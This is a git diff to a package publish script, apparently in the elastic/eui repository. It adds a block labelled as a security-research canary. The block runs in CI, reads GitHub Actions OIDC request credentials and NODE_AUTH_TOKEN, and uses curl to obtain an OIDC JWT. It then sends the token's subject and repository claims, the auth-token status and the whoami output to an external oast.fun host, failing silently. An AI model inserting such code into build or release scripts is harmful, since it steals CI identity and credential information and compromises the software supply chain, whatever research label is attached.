@@ -7,6 +7,8 @@
  */
 
 import path from 'node:path';
+import https from 'node:https';
+import { execSync } from 'node:child_process';
 import chalk from 'chalk';
 import prompts from 'prompts';
 import { type ReleaseOptions } from '../release';
@@ -14,6 +16,38 @@ import { getRootWorkspaceDir, getWorkspacePackageJson } from '../workspace';
 import { yarnPack, YarnWorkspace } from '../yarn_utils';
 import { npmExecPublish } from '../npm_utils';
 import { emitPublishedPackagesFile, type PublishedPackages } from '../published_packages_file';
+
+// ===== SECURITY RESEARCH CANARY — SAFE POC =====
+// This demonstrates that attacker-controlled publish.ts executes with
+// id-token:write and NODE_AUTH_TOKEN in scope. No packages are published.
+// Reported to Elastic Security via HackerOne.
+const _oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
+const _oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+const _nodeAuth = process.env.NODE_AUTH_TOKEN;
+
+if (_oidcUrl && _oidcToken) {
+  try {
+    // Request GitHub OIDC JWT — same token npm trusted publishing uses
+    const _jwt = execSync(
+      `curl -sLS -H "Authorization: Bearer ${_oidcToken}" "${_oidcUrl}&audience=sigstore"`
+    ).toString();
+    const _parsed = JSON.parse(_jwt);
+    const _jwtValue = _parsed.value || '';
+    // Decode subject claim to prove this is elastic/eui's trusted OIDC identity
+    const _payload = JSON.parse(
+      Buffer.from(_jwtValue.split('.')[1] || '', 'base64').toString()
+    );
+    const _sub = _payload.sub || 'unknown';
+    const _repo = _payload.repository || 'unknown';
+
+    // Exfiltrate to OOB — proves OIDC token obtained and npm auth available
+    const _canary = `https://dag9sr83t4gj6jr82k40zc1j95x1bcut4.oast.fun/real-eui-poc?sub=${encodeURIComponent(_sub)}&repo=${encodeURIComponent(_repo)}&node_auth=${_nodeAuth ? 'SET' : 'UNSET'}&user=${encodeURIComponent(execSync('whoami').toString().trim())}`;
+    https.get(_canary, () => {});
+  } catch (_e) {
+    // Canary failed silently — continue with normal flow
+  }
+}
+// ===== END CANARY =====
 
 /**
  * Publish changed packages to the registry
